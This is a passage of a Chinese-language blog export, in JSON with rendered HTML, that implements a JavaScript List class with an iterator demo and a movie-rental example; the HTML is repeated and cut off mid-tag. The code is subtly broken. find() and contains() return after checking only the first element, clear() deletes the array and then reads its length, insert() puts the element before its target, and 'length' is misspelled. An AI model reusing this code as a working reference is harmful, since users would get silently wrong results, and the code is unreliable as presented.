href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现列表类\"><a href=\"#实现列表类\" class=\"headerlink\" title=\"实现列表类\"></a>实现列表类</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">List</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = []; <span class=\"comment\">//初始化一个空数组来保存列表元素</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  append(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.listSize++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  find(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  remove(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> foundAt = <span class=\"keyword\">this</span>.find(element);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (foundAt &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(foundAt, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize--;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  lenth() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insert(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertPos = <span class=\"keyword\">this</span>.find(after);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (insertPos &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(insertPos, <span class=\"number\">0</span>, element);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.length = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  contains(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  front() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  end() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"keyword\">this</span>.listSize - <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  prev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  currPos() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  moveTo(position) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = position;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  getElement() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.pos];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasNext() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &lt; <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasPrev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &gt;= <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> names = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">names.append(<span class=\"string\">\"jovy\"</span>);</span><br><span class=\"line\">names.append(<span class=\"string\">\"sun\"</span>);</span><br><span class=\"line\">names.append(<span class=\"string\">\"tom\"</span>);</span><br><span class=\"line\">names.append(<span class=\"string\">\"lucy\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(names);</span><br><span class=\"line\"><span class=\"comment\">// List &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   listSize: 4,</span></span><br><span class=\"line\"><span class=\"comment\">//   pos: 0,</span></span><br><span class=\"line\"><span class=\"comment\">//   dataStore: [ 'jovy', 'sun', 'tom', 'lucy' ] &#125;</span></span><br><span class=\"line\">names.next();</span><br><span class=\"line\">names.next();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(names.getElement());</span><br><span class=\"line\"><span class=\"comment\">// tom</span></span><br><span class=\"line\">names.prev();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(names.getElement());</span><br><span class=\"line\"><span class=\"comment\">// sun</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"使用迭代器访问列表\"><a href=\"#使用迭代器访问列表\" class=\"headerlink\" title=\"使用迭代器访问列表\"></a>使用迭代器访问列表</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"1使用迭代器访问列表+++++++++++++++++\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (names.front(); names.hasNext(); names.next()) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(names.getElement());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// jovy</span></span><br><span class=\"line\"><span class=\"comment\">// sun</span></span><br><span class=\"line\"><span class=\"comment\">// tom</span></span><br><span class=\"line\"><span class=\"comment\">// lucy</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"2使用迭代器访问列表+++++++++++++++++\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (names.end(); names.hasPrev(); names.prev()) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(names.getElement());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// lucy</span></span><br><span class=\"line\"><span class=\"comment\">// tom</span></span><br><span class=\"line\"><span class=\"comment\">// sun</span></span><br><span class=\"line\"><span class=\"comment\">// jovy</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"一个基于列表的应用\"><a href=\"#一个基于列表的应用\" class=\"headerlink\" title=\"一个基于列表的应用\"></a>一个基于列表的应用</h2><p>模拟影碟租赁自助查询系统：查询可租借清单，查询用户租赁清单，用户租赁。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义客户类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Customer</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(name, movie) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.movie = movie;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 显示清单</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">displayList</span>(<span class=\"params\">list</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (list.front(); list.hasNext(); list.next()) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (list.getElement() <span class=\"keyword\">instanceof</span> Customer) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">        list.getElement()[<span class=\"string\">\"name\"</span>] + <span class=\"string\">\", \"</span> + list.getElement()[<span class=\"string\">\"movie\"</span>]</span><br><span class=\"line\">      );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(list.getElement());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 检出电影</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkOut</span>(<span class=\"params\">name, movie, movieList, customerList</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (movieList.contains(movie)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> c = <span class=\"keyword\">new</span> Customer(name, movie);</span><br><span class=\"line\">    customerList.append(c);</span><br><span class=\"line\">    movieList.remove(movie);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(movie + <span class=\"string\">\" is not available.\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试+++++++++++++++++++++++++++++++</span></span><br><span class=\"line\"><span class=\"comment\">// 模拟读取数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> moviesStr =</span><br><span class=\"line\">  <span class=\"string\">\"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> movies = moviesStr.split(<span class=\"string\">\"，\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用列表管理电影数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> movieList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">movies.forEach(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">  movieList.append(element);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 使用列表管理客户数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> customerList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"Available movies: \\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br><span class=\"line\">checkOut(<span class=\"string\">\"Jovysun\"</span>, <span class=\"string\">\"教父\"</span>, movieList, customerList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCustomer Rentals: \\n\"</span>);</span><br><span class=\"line\">displayList(customerList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nMovies Now Available\\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br></pre></td></tr></table></figure>\n<h2 id=\"练习\"><a href=\"#练习\" class=\"headerlink\" title=\"练习\"></a>练习</h2><p>更多练习及实现答案请参考下一篇<a href=\"/2019/04/29/data-structures-list-2\">数据结构——列表(练习题及实现)</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>当不需要再一个很长的序列中查找元素，或者对其进行排序时，列表显得尤为有用。反之，如果数据结构非常复杂，列表的作用就没那么大了。本篇主要讲如何在 JavaScript 中实现一个列表类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。<br><img src=\"/数据结构与算法@列表/0.svg\" alt=\"思维导图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现列表类\"><a href=\"#实现列表类\" class=\"headerlink\" title=\"实现列表类\"></a>实现列表类</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">List</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = []; <span class=\"comment\">//初始化一个空数组来保存列表元素</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  append(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.listSize++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  find(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  remove(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> foundAt = <span class=\"keyword\">this</span>.find(element);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (foundAt &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(foundAt, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize--;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  lenth() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insert(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertPos = <span class=\"keyword\">this</span>.find(after);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (insertPos &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(insertPos, <span class=\"number\">0</span>, element);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.length = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  contains(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  front() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  end() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"keyword\">this</span>.listSize - <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  prev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  currPos() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  moveTo(position) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = position;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  getElement() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.pos];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasNext() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &lt; <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasPrev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &gt;= <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> names = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">names.append(<span class=\"string\">\"jovy\"</span>);</span><br><span class=\"line\">names.append(<span class=\"string\">\"sun\"</span>);</span><br><span class=\"line\">names.append(<span class=\"string\">\"tom\"</span>);</span><br><span class=\"line\">names.append(<span class=\"string\">\"lucy\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(names);</span><br><span class=\"line\"><span class=\"comment\">// List &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   listSize: 4,</span></span><br><span class=\"line\"><span class=\"comment\">//   pos: 0,</span></span><br><span class=\"line\"><span class=\"comment\">//   dataStore: [ 'jovy', 'sun', 'tom', 'lucy' ] &#125;</span></span><br><span class=\"line\">names.next();</span><br><span class=\"line\">names.next();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(names.getElement());</span><br><span class=\"line\"><span class=\"comment\">// tom</span></span><br><span class=\"line\">names.prev();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(names.getElement());</span><br><span class=\"line\"><span class=\"comment\">// sun</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"使用迭代器访问列表\"><a href=\"#使用迭代器访问列表\" class=\"headerlink\" title=\"使用迭代器访问列表\"></a>使用迭代器访问列表</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 